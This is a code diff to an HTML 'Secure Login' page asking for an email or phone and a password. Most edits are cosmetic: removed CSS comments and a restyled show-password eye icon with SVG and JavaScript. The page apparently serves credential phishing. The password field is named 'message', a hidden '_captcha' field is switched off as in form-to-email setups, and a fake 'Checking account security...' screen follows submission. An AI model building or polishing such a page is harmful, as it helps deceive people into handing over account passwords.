@@ -20,7 +20,6 @@ transition:.35s;
 
 body.light{background:#f4f6f9}
 
-/* APP */
 .app{
 width:100%;
 max-width:430px;
@@ -32,14 +31,12 @@ position:relative;
 }
 body.light .app{background:white}
 
-/* LOGO */
 .logo{
 display:block;
 margin:0 auto 28px auto;
 width:140px;
 }
 
-/* PAGE */
 .page{
 padding:44px 32px;
 width:100%;
@@ -47,7 +44,6 @@ transition:.55s cubic-bezier(.77,0,.18,1);
 }
 .slide{transform:translateX(-100%)}
 
-/* TITLE */
 h1{
 font-size:28px;
 margin-bottom:34px;
@@ -56,10 +52,8 @@ text-align:center;
 }
 body.light h1{color:#111}
 
-/* FIELD */
 .field{position:relative;margin-bottom:24px}
 
-/* INPUT */
 input{
 width:100%;
 padding:18px 16px;
@@ -77,13 +71,11 @@ color:#111;
 border:1px solid #ccc;
 }
 
-/* FOCUS */
 input:focus{
 border-color:#f5c518;
 box-shadow:0 0 0 3px rgba(245,197,24,.22);
 }
 
-/* FLOAT LABEL */
 label{
 position:absolute;
 left:14px;
@@ -102,18 +94,30 @@ font-size:12px;
 color:#f5c518;
 }
 
-/* EYE */
+/* ⭐ PRO EYE STYLE */
 .eye{
 position:absolute;
-right:14px;
+right:12px;
 top:50%;
 transform:translateY(-50%);
 cursor:pointer;
-font-size:18px;
-opacity:.7;
+opacity:.75;
+display:flex;
+align-items:center;
+justify-content:center;
+padding:6px;
+border-radius:8px;
+transition:.2s;
+color:#9aa7b5;
+}
+.eye:hover{
+opacity:1;
+background:rgba(255,255,255,.06);
+}
+body.light .eye:hover{
+background:rgba(0,0,0,.06);
 }
 
-/* BUTTON */
 button{
 width:100%;
 padding:18px;
@@ -129,7 +133,6 @@ justify-content:center;
 gap:10px;
 }
 
-/* SPINNER */
 .spin{
 width:18px;height:18px;
 border:3px solid rgba(0,0,0,.25);
@@ -143,7 +146,6 @@ display:none;
 .verify{text-align:center;color:white;}
 body.light .verify{color:#111}
 
-/* THEME */
 .theme{
 position:absolute;
 top:12px;
@@ -172,7 +174,6 @@ body.light .theme{background:#eee;color:#111}
 <!-- LOGIN -->
 <div class="page" id="login">
 
-<!-- ✅ LOGO NOW CORRECT -->
 <img src="logo.png" class="logo" alt="Logo">
 
 <h1>Secure Login</h1>
@@ -184,10 +185,28 @@ body.light .theme{background:#eee;color:#111}
 <label>Email or Phone</label>
 </div>
 
+<!-- ⭐ UPDATED PASSWORD FIELD -->
 <div class="field">
+
 <input id="pass" type="password" name="message" placeholder=" " required>
 <label>Password</label>
-<div class="eye" onclick="togglePass()">👁</div>
+
+<div class="eye" onclick="togglePass()">
+
+<!-- OPEN -->
+<svg id="eyeOpen" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
+<circle cx="12" cy="12" r="3"/>
+</svg>
+
+<!-- CLOSED -->
+<svg id="eyeClosed" style="display:none" xmlns="http://www.w3.org/2000/svg" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+<path d="M1 1l22 22"/>
+<path d="M17.94 17.94A10.94 10.94 0 0 1 12 19C5 19 1 12 1 12a21.8 21.8 0 0 1 5.06-5.94"/>
+</svg>
+
+</div>
+
 </div>
 
 <input type="hidden" name="_captcha" value="false">
@@ -219,10 +238,23 @@ Checking account security...
 
 <script>
 
-/* PASSWORD */
+/* ⭐ PRO PASSWORD TOGGLE */
 function togglePass(){
+
 const p=document.getElementById("pass");
-p.type=p.type==="password"?"text":"password";
+const open=document.getElementById("eyeOpen");
+const closed=document.getElementById("eyeClosed");
+
+if(p.type==="password"){
+p.type="text";
+open.style.display="none";
+closed.style.display="block";
+}else{
+p.type="password";
+open.style.display="block";
+closed.style.display="none";
+}
+
 }
 
 /* THEME */
@@ -258,6 +290,7 @@ verify.classList.add("slide");
 }
 });
 };
+
 </script>
 
 </body>
